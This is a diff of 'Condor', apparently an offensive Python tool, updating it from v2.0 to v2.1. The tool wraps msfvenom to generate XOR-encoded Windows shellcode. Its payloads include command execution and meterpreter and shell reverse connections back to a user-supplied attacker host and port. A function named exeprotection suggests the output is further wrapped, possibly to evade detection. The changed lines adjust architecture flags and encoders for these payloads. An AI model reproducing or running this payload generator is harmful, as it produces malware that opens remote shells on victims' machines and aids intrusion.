@@ -21,7 +21,7 @@ def banner():
     ░ ░          ░ ░           ░    ░        ░ ░     ░     
     ░                             ░                        
 
-                        {Fore.LIGHTRED_EX}[{Fore.LIGHTWHITE_EX}Condor v2.0{Fore.LIGHTRED_EX}]
+                        {Fore.LIGHTRED_EX}[{Fore.LIGHTWHITE_EX}Condor v2.1{Fore.LIGHTRED_EX}]
                     {Fore.LIGHTRED_EX}[{Fore.LIGHTWHITE_EX}Developed by MrEmpy{Fore.LIGHTRED_EX}]
 
 ''')
@@ -43,14 +43,14 @@ def shellcode():
     if arguments.payload == 'windows/x64/exec':
         cmd = input(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Put the command: ')
         print(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Generating shellcode...')
-        subprocess.call(f'msfvenom -p windows/x64/exec CMD=\'{cmd}\' -e x64/xor -f py > workbench/shellcode.py', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.call(f'msfvenom -p windows/x64/exec -ax64 CMD=\'{cmd}\' -e x64/xor -f py > workbench/shellcode.py', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Shellcode generated!')
         return
 
     if arguments.payload == 'windows/exec':
         cmd = input(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Put the command: ')
         print(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Generating shellcode...')
-        subprocess.call(f'msfvenom -p windows/exec CMD=\'{cmd}\' -e x64/xor -f py > workbench/shellcode.py', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.call(f'msfvenom -p windows/exec -ax86 CMD=\'{cmd}\' -f py > workbench/shellcode.py', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Shellcode generated!')
         return
         
@@ -63,34 +63,34 @@ def shellcode():
 
     if arguments.payload == 'windows/x64/meterpreter/reverse_tcp':
         print(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Generating shellcode...')
-        subprocess.call(f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={arguments.lhost} LPORT={arguments.lport} -e x64/xor -f py > workbench/shellcode.py', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.call(f'msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 LHOST={arguments.lhost} LPORT={arguments.lport} -e x64/xor -f py > workbench/shellcode.py', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Shellcode generated!')
 
     if arguments.payload == 'windows/meterpreter/reverse_tcp':
         print(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Generating shellcode...')
-        subprocess.call(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={arguments.lhost} LPORT={arguments.lport} -e x64/xor -f py > workbench/shellcode.py', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.call(f'msfvenom -p windows/meterpreter/reverse_tcp -ax86 LHOST={arguments.lhost} LPORT={arguments.lport} -f py > workbench/shellcode.py', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Shellcode generated!')
 
 
     if arguments.payload == 'windows/meterpreter/reverse_http':
         print(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Generating shellcode...')
-        subprocess.call(f'msfvenom -p windows/meterpreter/reverse_http LHOST={arguments.lhost} LPORT={arguments.lport} -e x64/xor -f py > workbench/shellcode.py', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.call(f'msfvenom -p windows/meterpreter/reverse_http -ax86 LHOST={arguments.lhost} LPORT={arguments.lport} -f py > workbench/shellcode.py', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Shellcode generated!')
 
     if arguments.payload == 'windows/x64/meterpreter/reverse_http':
         print(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Generating shellcode...')
-        subprocess.call(f'msfvenom -p windows/x64/meterpreter/reverse_http LHOST={arguments.lhost} LPORT={arguments.lport} -e x64/xor -f py > workbench/shellcode.py', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.call(f'msfvenom -p windows/x64/meterpreter/reverse_http -ax64 LHOST={arguments.lhost} LPORT={arguments.lport} -e x64/xor -f py > workbench/shellcode.py', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Shellcode generated!')
 
 
     if arguments.payload == 'windows/shell/reverse_tcp':
         print(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Generating shellcode...')
-        subprocess.call(f'msfvenom -p windows/shell/reverse_tcp LHOST={arguments.lhost} LPORT={arguments.lport} -e x64/xor -f py > workbench/shellcode.py', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.call(f'msfvenom -p windows/shell/reverse_tcp -ax86 LHOST={arguments.lhost} LPORT={arguments.lport} -f py > workbench/shellcode.py', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Shellcode generated!')
 
     if arguments.payload == 'windows/x64/shell/reverse_tcp':
         print(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Generating shellcode...')
-        subprocess.call(f'msfvenom -p windows/x64/shell/reverse_tcp LHOST={arguments.lhost} LPORT={arguments.lport} -e x64/xor -f py > workbench/shellcode.py', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.call(f'msfvenom -p windows/x64/shell/reverse_tcp -ax64 LHOST={arguments.lhost} LPORT={arguments.lport} -e x64/xor -f py > workbench/shellcode.py', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Shellcode generated!')
 
 def exeprotection(scname):
